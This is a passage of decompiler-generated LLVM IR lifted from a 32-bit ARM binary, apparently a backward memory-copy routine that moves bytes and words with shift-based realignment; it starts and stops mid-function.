  %v15_2c214 = load i32, i32* %v14_2c214, align 4
  store i32 %v15_2c214, i32* @ip, align 4
  %v16_2c214 = add i32 %v6_2c214, -16
  %v17_2c214 = inttoptr i32 %v16_2c214 to i32*
  %v18_2c214 = load i32, i32* %v17_2c214, align 4
  store i32 %v18_2c214, i32* %lr.global-to-local, align 4
  store i32 %v16_2c214, i32* %r1.global-to-local, align 4
  %v7_2c218 = add i32 %v6_2c218, -16
  %v8_2c218 = inttoptr i32 %v7_2c218 to i32*
  store i32 %v9_2c214, i32* %v8_2c218, align 4
  %v10_2c218 = add i32 %v6_2c218, -12
  %v11_2c218 = inttoptr i32 %v10_2c218 to i32*
  %v12_2c218 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_2c218, i32* %v11_2c218, align 4
  %v13_2c218 = add i32 %v6_2c218, -8
  %v14_2c218 = inttoptr i32 %v13_2c218 to i32*
  %v15_2c218 = load i32, i32* @ip, align 4
  store i32 %v15_2c218, i32* %v14_2c218, align 4
  %v16_2c218 = add i32 %v6_2c218, -4
  %v17_2c218 = inttoptr i32 %v16_2c218 to i32*
  %v18_2c218 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_2c218, i32* %v17_2c218, align 4
  store i32 %v7_2c218, i32* %r0.global-to-local, align 4
  %v6_2c21c = load i32, i32* %r2.global-to-local, align 4
  %v7_2c21c = add i32 %v6_2c21c, -16
  store i32 %v7_2c21c, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_2c210, %bb148
  %v6_2c228 = phi i32 [ %v7_2c218, %bb148 ], [ %v6_2c218, %dec_label_pc_2c210 ]
  %v0_2c220 = phi i32 [ %v7_2c21c, %bb148 ], [ %v0_2c220.pr, %dec_label_pc_2c210 ]
  %v4_2c220 = add i32 %v0_2c220, 20
  store i32 %v4_2c220, i32* %r2.global-to-local, align 4
  %v6_2c220 = sub i32 0, %v0_2c220
  %v7_2c220 = and i32 %v4_2c220, %v6_2c220
  %v8_2c220 = icmp slt i32 %v7_2c220, 0
  store i1 %v8_2c220, i1* %cpsr_v.global-to-local, align 1
  %v9_2c220 = icmp slt i32 %v4_2c220, 0
  store i1 %v9_2c220, i1* %cpsr_n.global-to-local, align 1
  %v10_2c220 = icmp eq i32 %v4_2c220, 0
  store i1 %v10_2c220, i1* %cpsr_z.global-to-local, align 1
  %v5_2c224 = icmp slt i32 %v0_2c220, -20
  br i1 %v5_2c224, label %.thread4, label %bb149

bb149:                                            ; preds = %.thread2
  %v6_2c224 = load i32, i32* %r1.global-to-local, align 4
  %v7_2c224 = add i32 %v6_2c224, -4
  %v8_2c224 = inttoptr i32 %v7_2c224 to i32*
  %v9_2c224 = load i32, i32* %v8_2c224, align 4
  store i32 %v9_2c224, i32* @r3, align 4
  %v10_2c224 = add i32 %v6_2c224, -8
  %v11_2c224 = inttoptr i32 %v10_2c224 to i32*
  %v12_2c224 = load i32, i32* %v11_2c224, align 4
  store i32 %v12_2c224, i32* @ip, align 4
  %v13_2c224 = add i32 %v6_2c224, -12
  %v14_2c224 = inttoptr i32 %v13_2c224 to i32*
  %v15_2c224 = load i32, i32* %v14_2c224, align 4
  store i32 %v15_2c224, i32* %lr.global-to-local, align 4
  store i32 %v13_2c224, i32* %r1.global-to-local, align 4
  %v7_2c228 = add i32 %v6_2c228, -12
  %v8_2c228 = inttoptr i32 %v7_2c228 to i32*
  store i32 %v9_2c224, i32* %v8_2c228, align 4
  %v10_2c228 = add i32 %v6_2c228, -8
  %v11_2c228 = inttoptr i32 %v10_2c228 to i32*
  %v12_2c228 = load i32, i32* @ip, align 4
  store i32 %v12_2c228, i32* %v11_2c228, align 4
  %v13_2c228 = add i32 %v6_2c228, -4
  %v14_2c228 = inttoptr i32 %v13_2c228 to i32*
  %v15_2c228 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_2c228, i32* %v14_2c228, align 4
  store i32 %v7_2c228, i32* %r0.global-to-local, align 4
  %v6_2c22c = load i32, i32* %r2.global-to-local, align 4
  %v7_2c22c = add i32 %v6_2c22c, -12
  store i32 %v7_2c22c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb149
  %v6_2c24c45 = phi i32 [ %v6_2c228, %.thread2 ], [ %v7_2c228, %bb149 ]
  %v0_2c23443 = phi i32 [ %v4_2c220, %.thread2 ], [ %v7_2c22c, %bb149 ]
  %v2_2c230 = load i8*, i8** %stack_var_-8, align 4
  %v3_2c230 = ptrtoint i8* %v2_2c230 to i32
  store i32 %v3_2c230, i32* @r4, align 4
  store i32 %v8_2c1ec, i32* @lr, align 4
  br label %dec_label_pc_2c234

dec_label_pc_2c234:                               ; preds = %dec_label_pc_2c1e4, %.thread4
  %v7_2c244 = phi i32 [ %v0_2c1fc37, %dec_label_pc_2c1e4 ], [ %v6_2c24c45, %.thread4 ]
  %v0_2c234 = phi i32 [ %v2_2c1e4, %dec_label_pc_2c1e4 ], [ %v0_2c23443, %.thread4 ]
  %v2_2c234 = add i32 %v0_2c234, 8
  store i32 %v2_2c234, i32* %r2.global-to-local, align 4
  %v4_2c234 = sub i32 0, %v0_2c234
  %v5_2c234 = and i32 %v2_2c234, %v4_2c234
  %v6_2c234 = icmp slt i32 %v5_2c234, 0
  store i1 %v6_2c234, i1* %cpsr_v.global-to-local, align 1
  %v7_2c234 = icmp slt i32 %v2_2c234, 0
  store i1 %v7_2c234, i1* %cpsr_n.global-to-local, align 1
  %v8_2c234 = icmp eq i32 %v2_2c234, 0
  store i1 %v8_2c234, i1* %cpsr_z.global-to-local, align 1
  %v5_2c238 = icmp slt i32 %v0_2c234, -8
  br i1 %v5_2c238, label %bb151, label %dec_label_pc_2c23c

dec_label_pc_2c23c:                               ; preds = %dec_label_pc_2c234
  %v6_2c23c = add i32 %v0_2c234, 4
  store i32 %v6_2c23c, i32* %r2.global-to-local, align 4
  %v8_2c23c = sub i32 -5, %v0_2c234
  %v9_2c23c = and i32 %v8_2c23c, %v2_2c234
  %v10_2c23c = icmp slt i32 %v9_2c23c, 0
  store i1 %v10_2c23c, i1* %cpsr_v.global-to-local, align 1
  %v11_2c23c = icmp slt i32 %v6_2c23c, 0
  store i1 %v11_2c23c, i1* %cpsr_n.global-to-local, align 1
  %v12_2c23c = icmp eq i32 %v2_2c234, 4
  store i1 %v12_2c23c, i1* %cpsr_z.global-to-local, align 1
  %v5_2c240 = icmp slt i32 %v2_2c234, 4
  %v6_2c240 = load i32, i32* %r1.global-to-local, align 4
  %v7_2c240 = add i32 %v6_2c240, -4
  %v8_2c240 = inttoptr i32 %v7_2c240 to i32*
  %v9_2c240 = load i32, i32* %v8_2c240, align 4
  store i32 %v9_2c240, i32* @r3, align 4
  br i1 %v5_2c240, label %.thread8, label %bb150

.thread8:                                         ; preds = %dec_label_pc_2c23c
  store i32 %v7_2c240, i32* %r1.global-to-local, align 4
  %v8_2c244 = add i32 %v7_2c244, -4
  %v9_2c244 = inttoptr i32 %v8_2c244 to i32*
  store i32 %v9_2c240, i32* %v9_2c244, align 4
  %v10_2c244 = load i32, i32* %r0.global-to-local, align 4
  %v11_2c244 = add i32 %v10_2c244, -4
  store i32 %v11_2c244, i32* %r0.global-to-local, align 4
  %v0_2c254.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb151

bb150:                                            ; preds = %dec_label_pc_2c23c
  %v10_2c248 = add i32 %v6_2c240, -8
  %v11_2c248 = inttoptr i32 %v10_2c248 to i32*
  %v12_2c248 = load i32, i32* %v11_2c248, align 4
  store i32 %v12_2c248, i32* @ip, align 4
  store i32 %v10_2c248, i32* %r1.global-to-local, align 4
  %v7_2c24c = add i32 %v7_2c244, -8
  %v8_2c24c = inttoptr i32 %v7_2c24c to i32*
  store i32 %v9_2c240, i32* %v8_2c24c, align 4
  %v10_2c24c = add i32 %v7_2c244, -4
  %v11_2c24c = inttoptr i32 %v10_2c24c to i32*
  %v12_2c24c = load i32, i32* @ip, align 4
  store i32 %v12_2c24c, i32* %v11_2c24c, align 4
  store i32 %v7_2c24c, i32* %r0.global-to-local, align 4
  %v6_2c250 = load i32, i32* %r2.global-to-local, align 4
  %v7_2c250 = add i32 %v6_2c250, -4
  store i32 %v7_2c250, i32* %r2.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_2c234, %dec_label_pc_2c1c4, %dec_label_pc_2c3f8, %dec_label_pc_2c38c, %dec_label_pc_2c320, %bb150
  %v2_2c258 = phi i32 [ %v11_2c244, %.thread8 ], [ %v0_2c2f020, %.thread14 ], [ %v7_2c244, %dec_label_pc_2c234 ], [ %v2_2c1c8, %dec_label_pc_2c1c4 ], [ %v2_2c26453, %dec_label_pc_2c3f8 ], [ %v2_2c26452, %dec_label_pc_2c38c ], [ %v2_2c26451, %dec_label_pc_2c320 ], [ %v7_2c24c, %bb150 ]
  %v0_2c254 = phi i32 [ %v0_2c254.pre, %.thread8 ], [ %v2_2c298, %.thread14 ], [ %v2_2c234, %dec_label_pc_2c234 ], [ %v2_2c1cc, %dec_label_pc_2c1c4 ], [ %v0_2c25449, %dec_label_pc_2c3f8 ], [ %v0_2c25448, %dec_label_pc_2c38c ], [ %v0_2c25447, %dec_label_pc_2c320 ], [ %v7_2c250, %bb150 ]
  %v1_2c254 = add i32 %v0_2c254, 4
  store i32 %v1_2c254, i32* @r2, align 4
  %v3_2c254 = sub i32 0, %v0_2c254
  %v4_2c254 = and i32 %v1_2c254, %v3_2c254
  %v5_2c254 = icmp slt i32 %v4_2c254, 0
  store i1 %v5_2c254, i1* %cpsr_v.global-to-local, align 1
  %v6_2c254 = icmp slt i32 %v1_2c254, 0
  store i1 %v6_2c254, i1* %cpsr_n.global-to-local, align 1
  %v7_2c254 = icmp eq i32 %v1_2c254, 0
  store i1 %v7_2c254, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2c254, label %.thread130, label %bb152

bb152:                                            ; preds = %bb151
  %v1_2c25c = add i32 %v0_2c254, 2
  %v3_2c25c = sub i32 -3, %v0_2c254
  %v4_2c25c = and i32 %v3_2c25c, %v1_2c254
  %v5_2c25c = icmp slt i32 %v4_2c25c, 0
  store i1 %v5_2c25c, i1* %cpsr_v.global-to-local, align 1
  %v6_2c25c = icmp slt i32 %v1_2c25c, 0
  store i1 %v6_2c25c, i1* %cpsr_n.global-to-local, align 1
  %v7_2c25c = icmp eq i32 %v1_2c254, 2
  store i1 %v7_2c25c, i1* %cpsr_z.global-to-local, align 1
  %v0_2c260 = load i32, i32* %r1.global-to-local, align 4
  %v1_2c260 = add i32 %v0_2c260, -1
  %v2_2c260 = inttoptr i32 %v1_2c260 to i8*
  %v3_2c260 = load i8, i8* %v2_2c260, align 1
  %v4_2c260 = zext i8 %v3_2c260 to i32
  store i32 %v4_2c260, i32* @r3, align 4
  store i32 %v1_2c260, i32* %r1.global-to-local, align 4
  %v3_2c264 = add i32 %v2_2c258, -1
  %v4_2c264 = inttoptr i32 %v3_2c264 to i8*
  store i8 %v3_2c260, i8* %v4_2c264, align 1
  %v5_2c264 = load i32, i32* %r0.global-to-local, align 4
  %v6_2c264 = add i32 %v5_2c264, -1
  store i32 %v6_2c264, i32* %r0.global-to-local, align 4
  %v0_2c268 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_2c268 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_2c268 = xor i1 %v0_2c268, %v1_2c268
  br i1 %v2_2c268, label %.thread129, label %bb153

bb153:                                            ; preds = %bb152
  %v3_2c268 = load i32, i32* %r1.global-to-local, align 4
  %v4_2c268 = add i32 %v3_2c268, -1
  %v5_2c268 = inttoptr i32 %v4_2c268 to i8*
  %v6_2c268 = load i8, i8* %v5_2c268, align 1
  %v7_2c268 = zext i8 %v6_2c268 to i32
  store i32 %v7_2c268, i32* @r3, align 4
  store i32 %v4_2c268, i32* %r1.global-to-local, align 4
  %v6_2c26c = add i32 %v5_2c264, -2
  %v7_2c26c = inttoptr i32 %v6_2c26c to i8*
  store i8 %v6_2c268, i8* %v7_2c26c, align 1
  %v8_2c26c = load i32, i32* %r0.global-to-local, align 4
  %v9_2c26c = add i32 %v8_2c26c, -1
  store i32 %v9_2c26c, i32* %r0.global-to-local, align 4
  %v1_2c270.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_2c270.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb152, %bb153
  %v7_2c274 = phi i32 [ %v9_2c26c, %bb153 ], [ %v6_2c264, %bb152 ]
  %v2_2c274 = phi i1 [ %v2_2c270.pre, %bb153 ], [ %v1_2c268, %bb152 ]
  %v1_2c274 = phi i1 [ %v1_2c270.pre, %bb153 ], [ %v0_2c268, %bb152 ]
  %v0_2c270 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_2c270 = xor i1 %v2_2c274, %v1_2c274
  %v4_2c270 = or i1 %v0_2c270, %v3_2c270
  br i1 %v4_2c270, label %.thread130, label %bb154

bb154:                                            ; preds = %.thread129
  %v5_2c270 = load i32, i32* %r1.global-to-local, align 4
  %v6_2c270 = add i32 %v5_2c270, -1
  %v7_2c270 = inttoptr i32 %v6_2c270 to i8*
  %v8_2c270 = load i8, i8* %v7_2c270, align 1
  %v9_2c270 = zext i8 %v8_2c270 to i32
  store i32 %v9_2c270, i32* @r3, align 4
  store i32 %v6_2c270, i32* %r1.global-to-local, align 4
  %v8_2c274 = add i32 %v7_2c274, -1
  %v9_2c274 = inttoptr i32 %v8_2c274 to i8*
  store i8 %v8_2c270, i8* %v9_2c274, align 1
  %v10_2c274 = load i32, i32* %r0.global-to-local, align 4
  %v11_2c274 = add i32 %v10_2c274, -1
  store i32 %v11_2c274, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_2c27c:                               ; preds = %dec_label_pc_2c1d4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_2c27c = icmp eq i32 %v1_2c1d4, 1
  store i1 %v8_2c27c, i1* %cpsr_n.global-to-local, align 1
  %v9_2c27c = icmp eq i32 %v1_2c1d4, 2
  store i1 %v9_2c27c, i1* %cpsr_z.global-to-local, align 1
  %v1_2c280 = add i32 %v2_2c1c4, -1
  %v2_2c280 = inttoptr i32 %v1_2c280 to i8*
  %v3_2c280 = load i8, i8* %v2_2c280, align 1
  %v4_2c280 = zext i8 %v3_2c280 to i32
  store i32 %v4_2c280, i32* @r3, align 4
  store i32 %v1_2c280, i32* %r1.global-to-local, align 4
  %v3_2c284 = add i32 %v2_2c1c8, -1
  %v4_2c284 = inttoptr i32 %v3_2c284 to i8*
  store i8 %v3_2c280, i8* %v4_2c284, align 1
  %v5_2c284 = load i32, i32* %r0.global-to-local, align 4
  %v6_2c284 = add i32 %v5_2c284, -1
  store i32 %v6_2c284, i32* %r0.global-to-local, align 4
  br i1 %v8_2c27c, label %.thread14, label %bb155

bb155:                                            ; preds = %dec_label_pc_2c27c
  %v6_2c288 = load i32, i32* %r1.global-to-local, align 4
  %v7_2c288 = add i32 %v6_2c288, -1
  %v8_2c288 = inttoptr i32 %v7_2c288 to i8*
  %v9_2c288 = load i8, i8* %v8_2c288, align 1
  %v10_2c288 = zext i8 %v9_2c288 to i32
  store i32 %v10_2c288, i32* @r3, align 4
  store i32 %v7_2c288, i32* %r1.global-to-local, align 4
  %v9_2c28c = add i32 %v5_2c284, -2
  %v10_2c28c = inttoptr i32 %v9_2c28c to i8*
  store i8 %v9_2c288, i8* %v10_2c28c, align 1
  %v11_2c28c = load i32, i32* %r0.global-to-local, align 4
  %v12_2c28c = add i32 %v11_2c28c, -1
  store i32 %v12_2c28c, i32* %r0.global-to-local, align 4
  br i1 %v9_2c27c, label %.thread14, label %bb156

bb156:                                            ; preds = %bb155
  %v8_2c290 = load i32, i32* %r1.global-to-local, align 4
  %v9_2c290 = add i32 %v8_2c290, -1
  %v10_2c290 = inttoptr i32 %v9_2c290 to i8*
  %v11_2c290 = load i8, i8* %v10_2c290, align 1
  %v12_2c290 = zext i8 %v11_2c290 to i32
  store i32 %v12_2c290, i32* @r3, align 4
  store i32 %v9_2c290, i32* %r1.global-to-local, align 4
  %v11_2c294 = add i32 %v11_2c28c, -2
  %v12_2c294 = inttoptr i32 %v11_2c294 to i8*
  store i8 %v11_2c290, i8* %v12_2c294, align 1
  %v13_2c294 = load i32, i32* %r0.global-to-local, align 4
  %v14_2c294 = add i32 %v13_2c294, -1
  store i32 %v14_2c294, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb155, %dec_label_pc_2c27c, %bb156
  %v0_2c2f020 = phi i32 [ %v12_2c28c, %bb155 ], [ %v6_2c284, %dec_label_pc_2c27c ], [ %v14_2c294, %bb156 ]
  %v0_2c298 = load i32, i32* %r2.global-to-local, align 4
  %v1_2c298 = load i32, i32* @ip, align 4
  %v2_2c298 = sub i32 %v0_2c298, %v1_2c298
  store i32 %v2_2c298, i32* %r2.global-to-local, align 4
  %v4_2c298 = xor i32 %v1_2c298, %v0_2c298
  %v5_2c298 = xor i32 %v2_2c298, %v0_2c298
  %v6_2c298 = and i32 %v5_2c298, %v4_2c298
  %v7_2c298 = icmp slt i32 %v6_2c298, 0
  store i1 %v7_2c298, i1* %cpsr_v.global-to-local, align 1
  %v8_2c298 = icmp slt i32 %v2_2c298, 0
  store i1 %v8_2c298, i1* %cpsr_n.global-to-local, align 1
  %v9_2c298 = icmp eq i32 %v0_2c298, %v1_2c298
  store i1 %v9_2c298, i1* %cpsr_z.global-to-local, align 1
  %v5_2c29c = icmp slt i32 %v0_2c298, %v1_2c298
  br i1 %v5_2c29c, label %bb151, label %dec_label_pc_2c2a0

dec_label_pc_2c2a0:                               ; preds = %.thread14
  %v0_2c2a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_2c2a0 = urem i32 %v0_2c2a0, 4
  store i32 %v1_2c2a0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_2c2a0 = icmp eq i32 %v1_2c2a0, 0
  store i1 %v2_2c2a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2c2a0, label %dec_label_pc_2c1e4, label %dec_label_pc_2c2a8

dec_label_pc_2c2a8:                               ; preds = %dec_label_pc_2c1dc, %dec_label_pc_2c2a0
  %v0_2c2f019 = phi i32 [ %v2_2c1c8, %dec_label_pc_2c1dc ], [ %v0_2c2f020, %dec_label_pc_2c2a0 ]
  %v0_2c39c = phi i32 [ %v2_2c1cc, %dec_label_pc_2c1dc ], [ %v2_2c298, %dec_label_pc_2c2a0 ]
  %v0_2c2a8 = phi i32 [ %v2_2c1c4, %dec_label_pc_2c1dc ], [ %v0_2c2a0, %dec_label_pc_2c2a0 ]
  %v0_2c2b0 = phi i32 [ %v1_2c1dc, %dec_label_pc_2c1dc ], [ %v1_2c2a0, %dec_label_pc_2c2a0 ]
  %v1_2c2a8 = and i32 %v0_2c2a8, -4
  store i32 %v1_2c2a8, i32* %r1.global-to-local, align 4
  %v1_2c2ac = inttoptr i32 %v1_2c2a8 to i32*
  %v2_2c2ac = load i32, i32* %v1_2c2ac, align 4
  store i32 %v2_2c2ac, i32* @r3, align 4
  %v7_2c2b0 = icmp ult i32 %v0_2c2b0, 2
  %v2_2c394 = add i32 %v0_2c39c, -12
  %v4_2c394 = sub i32 11, %v0_2c39c
  %v5_2c394 = and i32 %v4_2c394, %v0_2c39c
  %v6_2c394 = icmp slt i32 %v5_2c394, 0
  store i1 %v6_2c394, i1* %cpsr_v.global-to-local, align 1
  %v7_2c394 = icmp slt i32 %v2_2c394, 0
  store i1 %v7_2c394, i1* %cpsr_n.global-to-local, align 1
  %v8_2c394 = icmp eq i32 %v0_2c39c, 12
  store i1 %v8_2c394, i1* %cpsr_z.global-to-local, align 1
  %v5_2c398 = icmp slt i32 %v0_2c39c, 12
  br i1 %v7_2c2b0, label %dec_label_pc_2c394, label %dec_label_pc_2c2b8

dec_label_pc_2c2b8:                               ; preds = %dec_label_pc_2c2a8
  %v8_2c2b0 = icmp eq i32 %v0_2c2b0, 2
  br i1 %v8_2c2b0, label %dec_label_pc_2c328, label %dec_label_pc_2c2bc

dec_label_pc_2c2bc:                               ; preds = %dec_label_pc_2c2b8
  br i1 %v5_2c398, label %dec_label_pc_2c308, label %dec_label_pc_2c2c4

dec_label_pc_2c2c4:                               ; preds = %dec_label_pc_2c2bc
  store i32 %v2_2c394, i32* %r2.global-to-local, align 4
  %v3_2c2c8 = load i32, i32* @r4, align 4
  store i32 %v3_2c2c8, i32* %stack_var_-12, align 4
  %v6_2c2c8 = load i32, i32* @r5, align 4
  %v8_2c2c8 = inttoptr i32 %v6_2c2c8 to i8*
  store i8* %v8_2c2c8, i8** %stack_var_-8, align 4
  %v11_2c2c8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_2c2cc

dec_label_pc_2c2cc:                               ; preds = %dec_label_pc_2c2cc.dec_label_pc_2c2cc_crit_edge, %dec_label_pc_2c2c4
  %v0_2c2f0 = phi i32 [ %v1_2c2f0, %dec_label_pc_2c2cc.dec_label_pc_2c2cc_crit_edge ], [ %v0_2c2f019, %dec_label_pc_2c2c4 ]
  %v0_2c2d0 = phi i32 [ %v0_2c2d0.pre, %dec_label_pc_2c2cc.dec_label_pc_2c2cc_crit_edge ], [ %v1_2c2a8, %dec_label_pc_2c2c4 ]
  %v0_2c2cc = phi i32 [ %v0_2c2cc.pre, %dec_label_pc_2c2cc.dec_label_pc_2c2cc_crit_edge ], [ %v2_2c2ac, %dec_label_pc_2c2c4 ]
  %v3_2c2cc = mul i32 %v0_2c2cc, 256
  store i32 %v3_2c2cc, i32* %lr.global-to-local, align 4
  %v1_2c2d0 = add i32 %v0_2c2d0, -4
  %v2_2c2d0 = inttoptr i32 %v1_2c2d0 to i32*
  %v3_2c2d0 = load i32, i32* %v2_2c2d0, align 4
  store i32 %v3_2c2d0, i32* @r3, align 4
  %v4_2c2d0 = add i32 %v0_2c2d0, -8
  %v5_2c2d0 = inttoptr i32 %v4_2c2d0 to i32*
  %v6_2c2d0 = load i32, i32* %v5_2c2d0, align 4
  store i32 %v6_2c2d0, i32* %r4.global-to-local, align 4
  %v7_2c2d0 = add i32 %v0_2c2d0, -12
  %v8_2c2d0 = inttoptr i32 %v7_2c2d0 to i32*
  %v9_2c2d0 = load i32, i32* %v8_2c2d0, align 4
  store i32 %v9_2c2d0, i32* %r5.global-to-local, align 4
  %v10_2c2d0 = add i32 %v0_2c2d0, -16
  %v11_2c2d0 = inttoptr i32 %v10_2c2d0 to i32*
  %v12_2c2d0 = load i32, i32* %v11_2c2d0, align 4
  store i32 %v10_2c2d0, i32* %r1.global-to-local, align 4
  %v4_2c2d4 = udiv i32 %v12_2c2d0, 16777216
  %v5_2c2d4 = or i32 %v4_2c2d4, %v3_2c2cc
  store i32 %v5_2c2d4, i32* %lr.global-to-local, align 4
  %v3_2c2d8 = mul i32 %v12_2c2d0, 256
  %v4_2c2dc = udiv i32 %v9_2c2d0, 16777216
  %v5_2c2dc = or i32 %v3_2c2d8, %v4_2c2dc
  store i32 %v5_2c2dc, i32* @ip, align 4
  %v3_2c2e0 = mul i32 %v9_2c2d0, 256
  %v4_2c2e4 = udiv i32 %v6_2c2d0, 16777216
  %v5_2c2e4 = or i32 %v3_2c2e0, %v4_2c2e4
  store i32 %v5_2c2e4, i32* %r5.global-to-local, align 4
  %v3_2c2e8 = mul i32 %v6_2c2d0, 256
  %v4_2c2ec = udiv i32 %v3_2c2d0, 16777216
  %v5_2c2ec = or i32 %v3_2c2e8, %v4_2c2ec
  store i32 %v5_2c2ec, i32* %r4.global-to-local, align 4
  %v1_2c2f0 = add i32 %v0_2c2f0, -16
  %v2_2c2f0 = inttoptr i32 %v1_2c2f0 to i32*
  store i32 %v5_2c2ec, i32* %v2_2c2f0, align 4
  %v4_2c2f0 = add i32 %v0_2c2f0, -12
  %v5_2c2f0 = inttoptr i32 %v4_2c2f0 to i32*
  %v6_2c2f0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_2c2f0, i32* %v5_2c2f0, align 4
  %v7_2c2f0 = add i32 %v0_2c2f0, -8
  %v8_2c2f0 = inttoptr i32 %v7_2c2f0 to i32*
  %v9_2c2f0 = load i32, i32* @ip, align 4
  store i32 %v9_2c2f0, i32* %v8_2c2f0, align 4
  %v10_2c2f0 = add i32 %v0_2c2f0, -4
  %v11_2c2f0 = inttoptr i32 %v10_2c2f0 to i32*
  %v12_2c2f0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_2c2f0, i32* %v11_2c2f0, align 4
  store i32 %v1_2c2f0, i32* %r0.global-to-local, align 4
  %v0_2c2f4 = load i32, i32* %r2.global-to-local, align 4
  %v2_2c2f4 = add i32 %v0_2c2f4, -16
  store i32 %v2_2c2f4, i32* %r2.global-to-local, align 4
  %v6_2c2f8 = icmp slt i32 %v0_2c2f4, 16
  br i1 %v6_2c2f8, label %dec_label_pc_2c2fc, label %dec_label_pc_2c2cc.dec_label_pc_2c2cc_crit_edge

dec_label_pc_2c2cc.dec_label_pc_2c2cc_crit_edge:  ; preds = %dec_label_pc_2c2cc
  %v0_2c2cc.pre = load i32, i32* @r3, align 4
  %v0_2c2d0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2c2cc

dec_label_pc_2c2fc:                               ; preds = %dec_label_pc_2c2cc
  %v2_2c2fc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_2c2fc, i32* @r4, align 4
  %v5_2c2fc = load i8*, i8** %stack_var_-8, align 4
  %v6_2c2fc = ptrtoint i8* %v5_2c2fc to i32
  store i32 %v6_2c2fc, i32* @r5, align 4
  store i32 %v11_2c2c8, i32* @lr, align 4
  %v2_2c300 = add i32 %v0_2c2f4, -4
  store i32 %v2_2c300, i32* %r2.global-to-local, align 4
  %v4_2c300 = add i32 %v0_2c2f4, 2147483632
  %v5_2c300 = and i32 %v2_2c300, %v4_2c300
  %v6_2c300 = icmp slt i32 %v5_2c300, 0
  store i1 %v6_2c300, i1* %cpsr_v.global-to-local, align 1
  %v7_2c300 = icmp slt i32 %v2_2c300, 0
  store i1 %v7_2c300, i1* %cpsr_n.global-to-local, align 1
  %v8_2c300 = icmp eq i32 %v2_2c300, 0
  store i1 %v8_2c300, i1* %cpsr_z.global-to-local, align 1
  %v5_2c304 = icmp slt i32 %v2_2c2f4, -12
  br i1 %v5_2c304, label %dec_label_pc_2c320, label %dec_label_pc_2c308

dec_label_pc_2c308:                               ; preds = %dec_label_pc_2c2fc, %dec_label_pc_2c2bc, %dec_label_pc_2c308
  %v1_2c314 = phi i32 [ %v5_2c314, %dec_label_pc_2c308 ], [ %v1_2c2f0, %dec_label_pc_2c2fc ], [ %v0_2c2f019, %dec_label_pc_2c2bc ]
  %v0_2c308 = load i32, i32* @r3, align 4
  %v3_2c308 = mul i32 %v0_2c308, 256
  store i32 %v3_2c308, i32* %ip.global-to-local, align 4
  %v0_2c30c = load i32, i32* %r1.global-to-local, align 4
  %v1_2c30c = add i32 %v0_2c30c, -4
  %v2_2c30c = inttoptr i32 %v1_2c30c to i32*
  %v3_2c30c = load i32, i32* %v2_2c30c, align 4
  store i32 %v3_2c30c, i32* @r3, align 4
  store i32 %v1_2c30c, i32* %r1.global-to-local, align 4
  %v4_2c310 = udiv i32 %v3_2c30c, 16777216
  %v5_2c310 = or i32 %v4_2c310, %v3_2c308
  store i32 %v5_2c310, i32* @ip, align 4
  %v2_2c314 = add i32 %v1_2c314, -4
  %v3_2c314 = inttoptr i32 %v2_2c314 to i32*
  store i32 %v5_2c310, i32* %v3_2c314, align 4
  %v4_2c314 = load i32, i32* %r0.global-to-local, align 4
  %v5_2c314 = add i32 %v4_2c314, -4
  store i32 %v5_2c314, i32* %r0.global-to-local, align 4
  %v0_2c318 = load i32, i32* %r2.global-to-local, align 4
  %v2_2c318 = add i32 %v0_2c318, -4
  store i32 %v2_2c318, i32* %r2.global-to-local, align 4
  %v6_2c31c = icmp slt i32 %v0_2c318, 4
  br i1 %v6_2c31c, label %dec_label_pc_2c320.loopexit, label %dec_label_pc_2c308

dec_label_pc_2c320.loopexit:                      ; preds = %dec_label_pc_2c308
  %v4_2c318 = sub i32 3, %v0_2c318
  %v5_2c318 = and i32 %v4_2c318, %v0_2c318
  %v6_2c318 = icmp slt i32 %v5_2c318, 0
  %v7_2c318 = icmp slt i32 %v2_2c318, 0
  store i1 %v6_2c318, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_2c318, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2c320

dec_label_pc_2c320:                               ; preds = %dec_label_pc_2c320.loopexit, %dec_label_pc_2c2fc
  %v2_2c26451 = phi i32 [ %v5_2c314, %dec_label_pc_2c320.loopexit ], [ %v1_2c2f0, %dec_label_pc_2c2fc ]
  %v0_2c25447 = phi i32 [ %v2_2c318, %dec_label_pc_2c320.loopexit ], [ %v2_2c300, %dec_label_pc_2c2fc ]
  %v0_2c320 = load i32, i32* %r1.global-to-local, align 4
  %v1_2c320 = add i32 %v0_2c320, 3
  store i32 %v1_2c320, i32* %r1.global-to-local, align 4
  br label %bb151

dec_label_pc_2c328:                               ; preds = %dec_label_pc_2c2b8
  br i1 %v5_2c398, label %dec_label_pc_2c374, label %dec_label_pc_2c330

dec_label_pc_2c330:                               ; preds = %dec_label_pc_2c328
  store i32 %v2_2c394, i32* %r2.global-to-local, align 4
  %v3_2c334 = load i32, i32* @r4, align 4
  store i32 %v3_2c334, i32* %stack_var_-12, align 4
  %v6_2c334 = load i32, i32* @r5, align 4
  %v8_2c334 = inttoptr i32 %v6_2c334 to i8*
